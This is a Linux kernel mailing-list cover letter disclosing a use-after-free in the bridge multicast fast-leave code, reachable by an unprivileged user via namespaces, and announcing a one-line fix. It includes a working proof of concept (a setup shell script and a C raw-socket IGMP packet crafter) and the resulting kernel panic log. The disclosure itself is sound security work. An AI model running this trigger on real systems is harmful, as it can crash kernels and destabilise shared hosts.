Received: from mail-pl1-f181.google.com (mail-pl1-f181.google.com [209.85.214.181])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DB36438F239
	for <bridge@lists.linux.dev>; Thu, 23 Jul 2026 16:53:05 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.181
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1784825587; cv=none; b=a9OZ0gjvFkvKIAcXV5aZkQmDdyFkKebmu1Glgu4/dVuZciyg5Uj31qTTSYhp79kR8iyqeYXsK1O1TfkEND3/N9fV4rgDqF/gC4y0fX3tcHwB3OdZgjWm8wexlncRCh0pxYcLF64uB25DBTEbmEx7+TSA9gDweqwbA2TOpyG9bvc=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1784825587; c=relaxed/simple;
	bh=r5H/1dpxR3F7+AWCZSMFLYNssDPe77cEA6mMVDg9/Ng=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=a5s2iw6dFkBpDm6fN88Xgc89Uqhv6cJfrKX8iDq8Rk7IwZVDAHW0uT7sL6q7Ufmn7UCi9UTB5/HysPls2+jFGxElowVxCsPO8uBHCQNmMZa+PalQ+maXyO5UZhCyOzpY7KMqnisRSkUbmenUKXs8VcgHdQA0e1waLvVyxeDEJ2s=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=ezxWpjoo; arc=none smtp.client-ip=209.85.214.181
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="ezxWpjoo"
Received: by mail-pl1-f181.google.com with SMTP id d9443c01a7336-2ceaf8a1265so11191725ad.2
        for <bridge@lists.linux.dev>; Thu, 23 Jul 2026 09:53:05 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784825585; x=1785430385; darn=lists.linux.dev;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=F3LCtdToF5YSS4uY+khZGArrOqwy6G7PSCxZEcos2+I=;
        b=ezxWpjoolUhgHfCZf+zU+UtMhdOG7PIBMmDMXhd0vSOKRub7uUA6k0526oZKA6Vwez
         CMKaC1QLAM99w/TOgNp/4TN4JWCDTo63ynurHVjE3kwUiE1sg4/WpQ+0NFykZVlsg3gP
         jkvaHQWG7K0SJrhmtCuziidqw/9a8xZN/WMT9R7J2c1o2+1WtD/Kh7HdyLSAv+tm9stO
         2hwrjQ4Sl7ttZJJ0ZKy2cH/MhRM1aR5LNtoK0RzL/deuirTyGmU45tFvDezvMYeJZ0Du
         kRTeDurCM8YlRLUxqV62zc9p6sateQrLSrvEFTt8A5BXZ7g5/NEGXQi8kTI5KEMkn5sy
         o3sg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784825585; x=1785430385;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=F3LCtdToF5YSS4uY+khZGArrOqwy6G7PSCxZEcos2+I=;
        b=VqSR+zq7PzNK6vuXRf6KQ/wkCNIllony4hCfzThb4fj1acqGbp7H/P4C3IDK2Gk1+Y
         SEe+3CYJEQ7wTQx6rwzNZmvditZ/dta0cTagOEQfzmlD7J9AqVqlcePraDI+rS/Hd9Jl
         y7gWpxBc+gjSTN8jXWIuJ6+VPErSQ3VkaBV7inTWfM3v3GGrcl9LpFDD1z/Ef5ShRLCq
         APztRpeRYYkylBlfrvabu11tDTQwMA07hJ0N3Gl4S6TG94NlmtmWqNMy3XF8ZdzZhe9M
         8nYf0z2Z8NYB1O7CYISCXTjSnhLankKz0DmRVpYgiYJDVyByj3+yOqp8ERQhxqxiyXhe
         2+dA==
X-Gm-Message-State: AOJu0YzeFzja88rD6yWpaVjOuR6zvVi4Efh1JJRRWMCKp7I/xmm3nxNy
	9+4hW1dLyLXIlEDkUhiuyjjolWo46pOTtaOwXVmEo0iwsg32wKTgmF1GnCAz/d6u6xI=
X-Gm-Gg: AR+sD12+hC4iODRVWeA8Q7uN3EN+EhhnmDbvGxlq2aHuc9vgeqoHuLNPN7JDPYbuVFf
	IX6O2Mynj8CvxmP0P3kVuQKZD/8zPKsxrLkAP7Ov/q8gw5lUu9dp7v9Ezp5GiiGiXlFCoyk5kZN
	rcVo9X9H6q0pxQF5bLO4rajNe0ND10GCIwwIe3nKdAnxVlrtrXPBVXHzsBfkczfw8OOrMzJUsID
	rhBQuNUEqGNR8fpsLuPJ+ohpsKBbaLqWEBiBfF0TtGqaKUk9eNNNdEqhESke0Bbu0Isls2oWUgl
	Vp+dn1NVrzAn5jIYhneotOoQ56k8e+n1RAF9rG8EDTQBbXzdNmIhSj4hjMFTyRzopR2KfvxO2rw
	/n+S+F0IC6ydnXwAytvF2hI7a6qmOhvFu4Fz0r7rnHHkcXRp4Jh0r8c2HH585zNI/kVuTUBVTB+
	U3WJz6AoifHTvwRnCeFvQ=
X-Received: by 2002:a17:903:3847:b0:2cf:b68a:2050 with SMTP id d9443c01a7336-2cfb68a395bmr17902655ad.15.1784825584978;
        Thu, 23 Jul 2026 09:53:04 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2cf8f2e5e9bsm36926435ad.50.2026.07.23.09.52.54
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 23 Jul 2026 09:53:04 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: bridge@lists.linux.dev,
	netdev@vger.kernel.org
Cc: razor@blackwall.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	nbd@nbd.name,
	linus.luessing@c0d3.blue,
	vega@nebusec.ai,
	zhilinz@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH net 0/1] net: bridge: fix fast-leave use-after-free
Date: Fri, 24 Jul 2026 00:52:47 +0800
Message-ID: <cover.1784707712.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: bridge@lists.linux.dev
List-Id: <bridge.lists.linux.dev>
List-Subscribe: <mailto:bridge+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:bridge+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated a issue in net/bridge/br_multicast.c. The bug
is reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

br_multicast_leave_group() walks mp->ports in the fast-leave path with
pp = &p->next.

When mcast_to_unicast is enabled, two IGMP membership reports from
different source MAC addresses behind the same bridge port create two
MDB port groups for one (port, group).

After mcast_to_unicast is turned off, br_port_group_equal() falls back
to comparing only the port. A single fast leave can then match both
entries. The first br_multicast_del_pg() unlinks one port group, but
the loop continues with pp taken from the removed entry. The second
match therefore updates the deleted entry's next pointer instead of
mp->ports, leaving mp->ports pointing at a removed port group.

The stale link is visible immediately as one leftover MDB entry on
veth0. During bridge teardown, br_multicast_destroy_mdb_entry() then
hits WARN_ON(mp->ports). With panic_on_warn=1, that warning becomes the
panic shown below.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc.sh

The shell script performs the full trigger sequence:
1. create br0 and veth0/veth1
2. enable fastleave and mcast_to_unicast on veth0
3. send two IGMP membership reports with different source MAC/IP pairs
4. verify that two MDB entries were created
5. disable mcast_to_unicast
6. send one IGMP leave
7. verify that one stale MDB entry remains
8. delete br0 to trigger bridge teardown

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------
#!/bin/sh
set -eu

PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

GROUP=239.1.1.1
JOIN_A_MAC=02:00:00:00:00:0a
JOIN_B_MAC=02:00:00:00:00:0b
JOIN_A_IP=10.0.0.10
JOIN_B_IP=10.0.0.11

cleanup() {
	ip link del br0 2>/dev/null || true
	ip link del veth0 2>/dev/null || true
}

require_duplicate_entries() {
	count=$(
		bridge -d mdb show dev br0 |
			grep -F "port veth0 grp $GROUP" |
			wc -l
	)
	if [ "$count" -ne 2 ]; then
		echo "expected 2 MDB entries for $GROUP on veth0, got $count" >&2
		exit 1
	fi
}

require_stale_entry() {
	count=$(
		bridge -d mdb show dev br0 |
			grep -F "port veth0 grp $GROUP" |
			wc -l
	)
	if [ "$count" -ne 1 ]; then
		echo "expected 1 stale MDB entry for $GROUP on veth0, got $count" >&2
		exit 1
	fi
}

cleanup

ip link add br0 type bridge mcast_snooping 1
ip link add veth0 type veth peer name veth1
ip link set br0 up
ip link set veth0 master br0
ip link set veth0 up
ip link set veth1 up
bridge link set dev veth0 fastleave on mcast_to_unicast on

./poc veth1 "$JOIN_A_MAC" "$JOIN_A_IP" "$GROUP" 0x16 "$GROUP"
./poc veth1 "$JOIN_B_MAC" "$JOIN_B_IP" "$GROUP" 0x16 "$GROUP"
sleep 1
require_duplicate_entries

bridge link set dev veth0 mcast_to_unicast off
./poc veth1 "$JOIN_A_MAC" "$JOIN_A_IP" 224.0.0.2 0x17 "$GROUP"
sleep 1
require_stale_entry

bridge -d mdb show dev br0 | grep -F "port veth0 grp $GROUP" || true

# The stale mp->ports entry trips WARN_ON(mp->ports) in bridge teardown.
ip link del br0
------END poc.sh--------

------BEGIN poc.c------
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static uint16_t checksum(const void *buf, size_t len)
{
	const uint8_t *data = buf;
	uint32_t sum = 0;

	while (len > 1) {
		sum += ((uint32_t)data[0] << 8) | data[1];
		data += 2;
		len -= 2;
	}

	if (len)
		sum += (uint32_t)data[0] << 8;

	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);

	return (uint16_t)~sum;
}

static int parse_mac(const char *text, uint8_t mac[ETH_ALEN])
{
	unsigned int tmp[ETH_ALEN];

	if (sscanf(text, "%02x:%02x:%02x:%02x:%02x:%02x",
		   &tmp[0], &tmp[1], &tmp[2],
		   &tmp[3], &tmp[4], &tmp[5]) != ETH_ALEN)
		return -1;

	for (size_t i = 0; i < ETH_ALEN; i++)
		mac[i] = tmp[i];

	return 0;
}

static void multicast_mac_from_ip(const struct in_addr *ip, uint8_t mac[ETH_ALEN])
{
	const uint8_t *addr = (const uint8_t *)&ip->s_addr;

	mac[0] = 0x01;
	mac[1] = 0x00;
	mac[2] = 0x5e;
	mac[3] = addr[1] & 0x7f;
	mac[4] = addr[2];
	mac[5] = addr[3];
}

int main(int argc, char **argv)
{
	struct sockaddr_ll sll = { 0 };
	struct in_addr src_ip;
	struct in_addr dst_ip;
	struct in_addr group_ip;
	uint8_t frame[ETH_FRAME_LEN];
	uint8_t src_mac[ETH_ALEN];
	uint8_t dst_mac[ETH_ALEN];
	unsigned long igmp_type;
	char *end;
	int fd;
	int ifindex;
	int count = 1;
	size_t off = 0;
	uint16_t ip_id = 0x1234;

	if (argc != 7 && argc != 8) {
		fprintf(stderr,
			"usage: %s <iface> <src-mac> <src-ip> <dst-ip> <igmp-type> <group> [count]\n",
			argv[0]);
		return 1;
	}

	if (parse_mac(argv[2], src_mac) < 0) {
		fprintf(stderr, "invalid mac: %s\n", argv[2]);
		return 1;
	}

	if (inet_pton(AF_INET, argv[3], &src_ip) != 1 ||
	    inet_pton(AF_INET, argv[4], &dst_ip) != 1 ||
	    inet_pton(AF_INET, argv[6], &group_ip) != 1) {
		fprintf(stderr, "invalid IPv4 address\n");
		return 1;
	}

	errno = 0;
	igmp_type = strtoul(argv[5], &end, 0);
	if (errno || *end || igmp_type > 0xff) {
		fprintf(stderr, "invalid igmp type: %s\n", argv[5]);
		return 1;
	}

	if (argc == 8) {
		errno = 0;
		count = strtol(argv[7], &end, 0);
		if (errno || *end || count < 1) {
			fprintf(stderr, "invalid count: %s\n", argv[7]);
			return 1;
		}
	}

	ifindex = if_nametoindex(argv[1]);
	if (!ifindex) {
		perror("if_nametoindex");
		return 1;
	}

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
	if (fd < 0) {
		perror("socket");
		return 1;
	}

	multicast_mac_from_ip(&dst_ip, dst_mac);

	memcpy(frame + off, dst_mac, ETH_ALEN);
	off += ETH_ALEN;
	memcpy(frame + off, src_mac, ETH_ALEN);
	off += ETH_ALEN;
	*(uint16_t *)(frame + off) = htons(ETH_P_IP);
	off += sizeof(uint16_t);

	frame[off + 0] = 0x45;
	frame[off + 1] = 0x00;
	*(uint16_t *)(frame + off + 2) = htons(20 + 8);
	*(uint16_t *)(frame + off + 4) = 0;
	*(uint16_t *)(frame + off + 6) = 0;
	frame[off + 8] = 1;
	frame[off + 9] = 2;
	*(uint16_t *)(frame + off + 10) = 0;
	memcpy(frame + off + 12, &src_ip.s_addr, sizeof(src_ip.s_addr));
	memcpy(frame + off + 16, &dst_ip.s_addr, sizeof(dst_ip.s_addr));
	off += 20;

	frame[off + 0] = (uint8_t)igmp_type;
	frame[off + 1] = 0;
	*(uint16_t *)(frame + off + 2) = 0;
	memcpy(frame + off + 4, &group_ip.s_addr, sizeof(group_ip.s_addr));
	*(uint16_t *)(frame + off + 2) = htons(checksum(frame + off, 8));

	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

	for (int i = 0; i < count; i++) {
		*(uint16_t *)(frame + ETH_HLEN + 4) = htons(ip_id++);
		*(uint16_t *)(frame + ETH_HLEN + 10) = 0;
		*(uint16_t *)(frame + ETH_HLEN + 10) =
			htons(checksum(frame + ETH_HLEN, 20));

		if (sendto(fd, frame, ETH_HLEN + 20 + 8, 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0) {
			perror("sendto");
			close(fd);
			return 1;
		}
	}

	close(fd);
	return 0;
}
------END poc.c--------

----BEGIN crash log----
[  345.588282] Kernel panic - not syncing: kernel: panic_on_warn set ...
[  345.589187] CPU: 2 UID: 0 PID: 1229 Comm: ip Not tainted 6.12.95 #1
[  345.590002] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  345.591456] Call Trace:
[  345.591786]  <TASK>
[  345.592071]  panic+0x352/0x3e0
[  345.592490]  ? br_multicast_destroy_mdb_entry+0x43/0x50
[  345.593161]  check_panic_on_warn+0x44/0x60
[  345.593700]  __warn+0x91/0x120
[  345.594103]  ? br_multicast_destroy_mdb_entry+0x43/0x50
[  345.594782]  report_bug+0x150/0x170
[  345.595258]  handle_bug+0x10a/0x170
[  345.595718]  exc_invalid_op+0x17/0x70
[  345.596210]  asm_exc_invalid_op+0x1a/0x20
[  345.596735] RIP: 0010:br_multicast_destroy_mdb_entry+0x43/0x50
[  345.597488] Code: 48 83 7b 98 00 75 23 48 8d 7b c8 e8 c7 12 b1 fe 48 85 ed 74 0e 48 8d 7b 18 48 89 ee 5b 5d e9 54 22 af fe 5b 5d e9 f8 07 3a 00 <0f> 0b eb d9 0f 0b eb ce 0f 1f 44 00 00 90 90 90 90 90 90 90 90 90
[  345.599833] RSP: 0018:ffffc900017bb6a8 EFLAGS: 00010286
[  345.600505] RAX: ffffffff827638d0 RBX: ffff888105fcb5b8 RCX: 0000000000001388
[  345.601458] RDX: ffff88813bd21ff8 RSI: 0000000000000286 RDI: ffff888105fcb5b8
[  345.602380] RBP: ffff888105fcb540 R08: 0000000000000000 R09: 0000000000000000
[  345.603297] R10: ffff88813bd21ed8 R11: 0000000000000000 R12: ffff888101bd2df4
[  345.604195] R13: ffff888105715540 R14: ffff8881033921c0 R15: dead000000000100
[  345.605103]  ? __pfx_br_multicast_destroy_mdb_entry+0x10/0x10
[  345.605856]  ? srso_alias_return_thunk+0x5/0xfbef5
[  345.606487]  br_multicast_dev_del+0xf4/0x130
[  345.607042]  br_dev_uninit+0x19/0x40
[  345.607523]  unregister_netdevice_many_notify+0x6ca/0xaf0
[  345.608222]  ? srso_alias_return_thunk+0x5/0xfbef5
[  345.608840]  ? srso_alias_return_thunk+0x5/0xfbef5
[  345.609466]  ? unregister_netdevice_queue+0x75/0x140
[  345.610099]  rtnl_dellink+0x166/0x3c0
[  345.610585]  ? rtnl_getlink+0x374/0x410
[  345.611099]  ? set_track_prepare+0x4f/0x80
[  345.611643]  ? kmalloc_reserve+0x93/0x100
[  345.612163]  ? __alloc_skb+0x95/0x1a0
[  345.612652]  ? netlink_sendmsg+0x157/0x490
[  345.613187]  ? __sock_sendmsg+0x83/0x90
[  345.613695]  ? ____sys_sendmsg+0x28c/0x310
[  345.614236]  ? ___sys_sendmsg+0x9a/0xe0
[  345.614734]  ? __sys_sendmsg+0x87/0xe0
[  345.615232]  ? do_syscall_64+0x58/0x120
[  345.615740]  ? entry_SYSCALL_64_after_hwframe+0x76/0x7e
[  345.616418]  ? srso_alias_return_thunk+0x5/0xfbef5
[  345.617032]  rtnetlink_rcv_msg+0x2ca/0x440
[  345.617580]  ? ___slab_alloc+0x989/0xba0
[  345.618092]  ? srso_alias_return_thunk+0x5/0xfbef5
[  345.618720]  ? kmalloc_reserve+0x93/0x100
[  345.619256]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[  345.619871]  netlink_rcv_skb+0x58/0x110
[  345.620388]  netlink_unicast+0x25d/0x390
[  345.620900]  netlink_sendmsg+0x222/0x490
[  345.621424]  __sock_sendmsg+0x83/0x90
[  345.621907]  ____sys_sendmsg+0x28c/0x310
[  345.622428]  ? copy_msghdr_from_user+0x7d/0xc0
[  345.623006]  ___sys_sendmsg+0x9a/0xe0
[  345.623531]  ? srso_alias_return_thunk+0x5/0xfbef5
[  345.624151]  __sys_sendmsg+0x87/0xe0
[  345.624638]  do_syscall_64+0x58/0x120
[  345.625125]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[  345.625779] RIP: 0033:0x7aea67b26687
[  345.626255] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  345.628634] RSP: 002b:00007ffc1d15bbc0 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
[  345.629591] RAX: ffffffffffffffda RBX: 00007aea678f9840 RCX: 00007aea67b26687
[  345.630517] RDX: 0000000000000000 RSI: 00007ffc1d15bc70 RDI: 0000000000000003
[  345.631442] RBP: 00007ffc1d15bc70 R08: 0000000000000000 R09: 0000000000000000
[  345.632345] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffc1d15c360
[  345.633246] R13: 0000000000000000 R14: 00005b70f0fc8020 R15: 0000000000000000
[  345.634148]  </TASK>
[  345.634788] Kernel Offset: disabled

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  net: bridge: stop fast-leave after deleting a port group

 net/bridge/br_multicast.c | 1 +
 1 file changed, 1 insertion(+)

-- 
2.43.0
